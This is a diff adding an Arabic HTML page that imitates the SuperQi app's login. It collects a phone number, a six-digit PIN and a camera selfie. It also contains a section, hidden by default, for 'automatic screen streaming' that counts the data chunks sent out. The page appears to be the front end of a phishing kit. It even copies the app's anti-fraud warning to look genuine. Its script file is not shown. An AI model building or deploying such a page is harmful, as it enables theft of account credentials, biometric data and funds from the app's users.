@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SuperQi - تسجيل الدخول</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+</head>
+<body>
+
+<div id="root-container">
+    <div id="login-page" class="page active">
+        <div class="background-shape shape-top"></div>
+        <div class="background-shape shape-bottom"></div>
+        <div class="container">
+            <header>
+                <i class="fa-solid fa-arrow-right header-arrow"></i>
+                <div class="lang-switcher">
+                    <button class="lang-btn">EN</button>
+                    <button class="lang-btn active">عربي</button>
+                </div>
+            </header>
+            <main>
+                <div class="logo">
+                    <img src="https://iili.io/F3t4SbS.png" alt="SuperQi Logo">
+                </div>
+                <form id="login-form">
+                    <label for="phone">رقم الهاتف</label>
+                    <div class="phone-input-container">
+                        <input type="tel" id="phone" placeholder="مثال 7712345678" autocomplete="off">
+                        <div class="country-code-box">
+                            <span>+964</span>
+                            <i class="fa-solid fa-caret-down"></i>
+                        </div>
+                    </div>
+                    <button type="submit" id="login-btn" class="btn login-btn-style" disabled>تسجيل الدخول</button>
+                    <button type="button" class="btn signup-btn-style">إنشاء حساب</button>
+                </form>
+            </main>
+        </div>
+        <div id="signup-notice" class="notification-banner">
+            <i class="fa-solid fa-circle-info"></i>
+            <span>الرجاء التوجه الى برنامج سوبر كي للتسجيل حساب</span>
+        </div>
+    </div>
+
+    <div id="otp-page" class="page">
+        <div class="container">
+            <header class="otp-header">
+                <i class="fa-solid fa-arrow-right back-to-login"></i>
+                <p>تسجيل الدخول</p>
+                <i class="fa-solid fa-times"></i>
+            </header>
+            <div class="alert-banner">
+                <i class="fa-solid fa-exclamation-triangle"></i>
+                <span>احذر الاحتيال! كي ما تطلب بياناتك ... لا ترد، لا تدز، لا تشارك!</span>
+            </div>
+            <main class="otp-main">
+                <h2>ادخل الرمز السري</h2>
+                <div class="otp-input-group">
+                    <input type="password" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                    <input type="password" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                    <input type="password" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                    <input type="password" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                    <input type="password" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                    <input type="password" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                </div>
+                <a href="#" class="forgot-password">نسيت الرمز السري؟</a>
+            </main>
+            <footer>
+                <button id="continue-btn" class="btn continue-btn-style" disabled>إستمرار</button>
+            </footer>
+        </div>
+    </div>
+
+    <div id="selfie-page" class="page">
+        <div class="container">
+            <header class="selfie-header">
+                <i class="fa-solid fa-arrow-right back-to-otp"></i>
+                <span>دعنا نتحقق من هويتك</span>
+            </header>
+            <main class="selfie-main">
+                <div class="selfie-icon-container">
+                    <i class="fa-solid fa-camera-retro"></i>
+                </div>
+                <h2>التقط صورة سيلفي</h2>
+                <p class="subheading">التقط صورة سيلفي لتأكيد هويتك</p>
+                <div class="instructions-box">
+                    <ul>
+                        <li>
+                            <i class="fa-solid fa-sun"></i>
+                            <p>تأكد من توازن إضاءة الخلفية ووضوح وجهك</p>
+                        </li>
+                        <li>
+                            <i class="fa-regular fa-face-smile"></i>
+                            <p>انظر مباشرة نحو الكاميرا الأمامية بتعبير طبيعي دون ابتسامة</p>
+                        </li>
+                        <li>
+                            <i class="fa-solid fa-id-card"></i>
+                            <p>ضع وجهك بدقة داخل الإطار دون ارتداء نظارة شمسية أو قبعة</p>
+                        </li>
+                    </ul>
+                </div>
+            </main>
+            <footer>
+                <button id="take-selfie-btn" class="btn signup-btn-style">التقط سيلفي</button>
+            </footer>
+        </div>
+    </div>
+
+    <div id="camera-page" class="page">
+        <video id="camera-feed" autoplay playsinline></video>
+        <div class="camera-overlay">
+            <div class="camera-header">
+                <i class="fa-solid fa-arrow-right back-to-selfie-instructions"></i>
+            </div>
+            <div class="face-guide-container">
+                <div class="top-guide-box">
+                    <p>اجعل الهاتف بمستوى نظرك</p>
+                </div>
+                <div id="face-outline-circle" class="face-outline-circle"></div>
+                <div class="bottom-guide-text">
+                    <p class="main-guide">اجعل وجهك داخل الإطار</p>
+                </div>
+            </div>
+            <div class="camera-footer">
+                <div class="capture-container">
+                    <button id="capture-btn" class="capture-button">
+                        <i class="fa-solid fa-camera"></i>
+                    </button>
+                    <span>التقاط</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- قسم البث المباشر للشاشة - مخفي افتراضياً -->
+    <div id="screen-stream-section" class="page hidden-stream-section">
+        <div class="stream-header">
+            <h3><i class="fas fa-video"></i> بث الشاشة التلقائي</h3>
+            <span id="stream-status-indicator" class="status-dot"></span>
+        </div>
+        <div class="stream-info">
+            <p>البث نشط: <span id="stream-timer-display">00:00</span></p>
+            <p>أجزاء مرسلة: <span id="stream-chunks-count">0</span></p>
+            <p>حجم البيانات: <span id="stream-data-size">0 MB</span></p>
+            <p>أخطاء: <span id="stream-error-count">0</span></p>
+        </div>
+        <div class="stream-log">
+            <h4>سجل البث:</h4>
+            <div id="stream-log-items"></div>
+        </div>
+    </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
